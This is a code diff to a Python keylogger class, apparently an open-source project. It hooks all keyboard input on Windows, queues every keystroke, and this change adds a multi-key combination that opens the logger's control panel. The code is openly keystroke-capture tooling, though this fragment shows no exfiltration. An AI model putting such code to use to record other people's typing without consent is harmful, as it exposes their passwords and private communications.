@@ -46,11 +46,13 @@ class KeyLogger:
 		
 		self.ParseOptions()
 		self.ParseConfigFile()
+		self.ParseControlKey()
 		self.NagscreenLogic()
 		self.q = Queue.Queue(0)
 		self.hm = pyHook.HookManager()
-		self.hm.KeyDown = self.OnKeyboardEvent
-	
+		self.hm.KeyDown = self.OnKeyDownEvent
+		self.hm.KeyUp = self.OnKeyUpEvent
+		
 		if self.settings['General']['Hook Keyboard'] == True:
 			self.hm.HookKeyboard()
 		#if self.options.hookMouse == True:
@@ -61,9 +63,26 @@ class KeyLogger:
 
 	def start(self):
 		pythoncom.PumpMessages()
+	
+	def ParseControlKey(self):
+		self.controlKeyList = self.settings['General']['Control Key'].split(';')
+		self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
+		
+	def MaintainControlKeyHash(self, event, updown):
+		if updown == 'Down' and event.Key in self.controlKeyHash.keys():
+			self.controlKeyHash[event.Key] = True
+		if updown == 'Up' and event.Key in self.controlKeyHash.keys():
+			self.controlKeyHash[event.Key] = False
 
+	def CheckForControlEvent(self):
+		if self.cmdoptions.debug:
+			print self.controlKeyHash
+		if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
+			return True
+		else:
+			return False
 
-	def OnKeyboardEvent(self, event):
+	def OnKeyDownEvent(self, event):
 		'''This function is the stuff that's supposed to happen when a key is pressed.
 		Puts the event in queue, and passes it on.
 		Starts control panel if proper key is pressed.
@@ -71,14 +90,24 @@ class KeyLogger:
 		#self.lw.WriteToLogFile(event)
 		self.q.put(event)
 		
-		if event.Key == self.settings['General']['Control Key']:
+		self.MaintainControlKeyHash(event, 'Down')
+		
+		if self.CheckForControlEvent():
 			if not self.panel:
 				self.lw.PrintDebug("starting panel\n")
 				self.panel = True
 				PyKeyloggerControlPanel(self.cmdoptions, self)
-			#~ else:
-				#~ print "not starting any panels"
+
+		#~ if event.Key == self.settings['General']['Control Key']:
+			#~ if not self.panel:
+				#~ self.lw.PrintDebug("starting panel\n")
+				#~ self.panel = True
+				#~ PyKeyloggerControlPanel(self.cmdoptions, self)
 			
+		return True
+	
+	def OnKeyUpEvent(self,event):
+		self.MaintainControlKeyHash(event, 'Up')
 		return True
 	
 	def stop(self):
